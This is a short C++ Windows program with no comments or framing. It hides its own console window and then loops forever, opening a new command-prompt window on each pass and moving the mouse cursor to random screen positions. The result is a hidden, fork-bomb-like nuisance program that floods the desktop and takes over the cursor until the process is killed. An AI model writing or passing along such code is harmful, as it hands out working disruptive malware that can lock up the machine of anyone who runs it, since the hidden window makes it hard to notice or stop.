#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
void HideWindow() {
    HWND hwnd;
    hwnd = FindWindow("ConsoleWindowClass", NULL);
    if (hwnd)
        ShowWindow(hwnd, SW_HIDE);
    return;
}
int main() {
    HideWindow();
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    for (;;) {
        system("start cmd");
        for (int i = 1; i <= 100; i++) {
            SetCursorPos(rand() % y, rand() % x);
        }
    }

    return 0;
}